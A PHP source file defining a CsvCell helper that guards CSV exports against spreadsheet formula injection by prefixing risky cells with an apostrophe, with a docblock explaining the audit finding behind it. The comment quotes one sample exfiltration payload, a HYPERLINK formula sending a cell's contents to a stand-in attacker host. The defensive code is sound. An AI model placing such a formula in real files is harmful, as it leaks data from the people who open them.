<?php

namespace App\Support;

/**
 * Neutralise a spreadsheet formula in a CSV cell (SECURITY AUDIT 2026-08-21,
 * V9 — extracted here 2026-09-05 when a second export needed the same rule).
 *
 * ── THE ATTACK THIS EXISTS FOR ──
 *
 * A cell beginning `=HYPERLINK("http://attacker.example/?x="&A1,"เปิด")`
 * exfiltrates whatever is in A1 the moment somebody clicks it; the DDE
 * variants on older Office builds do worse. Excel, not this application, is
 * what executes it — which is exactly why the file must not be handed over
 * armed. Every export in this codebase carries free text somebody outside
 * the reading company typed (an agent's own name, a bank account holder, an
 * audit row's old/new values), and every reader opens it in a spreadsheet
 * precisely because their own system produced it. That is the complete
 * setup, and it does not depend on which export is being written.
 *
 * ── WHY IT IS A SHARED CLASS NOW ──
 *
 * It was a private static on AgentCommissionSummaryController and was about
 * to be copy-pasted into the audit-log export. Two copies of a security rule
 * is one copy that gets fixed and one that does not; the day somebody adds a
 * character to the list, the other file keeps shipping the old one. Both
 * callers now use this, and CsvCellTest is the single place the rule is
 * asserted.
 *
 * The fix itself is the boring standard one: a leading apostrophe makes the
 * spreadsheet treat the cell as text. It is invisible in the rendered cell,
 * so the file stays readable. Tab and CR are in the list because both can
 * shift a payload into a neighbouring cell.
 */
final class CsvCell
{
    /** Characters that start a formula, plus the two that can move a payload between cells. */
    private const DANGEROUS_FIRST_CHARACTERS = "=+-@\t\r";

    public static function safe(string $value): string
    {
        if ($value === '') {
            return $value;
        }

        return str_contains(self::DANGEROUS_FIRST_CHARACTERS, $value[0]) ? "'".$value : $value;
    }
}
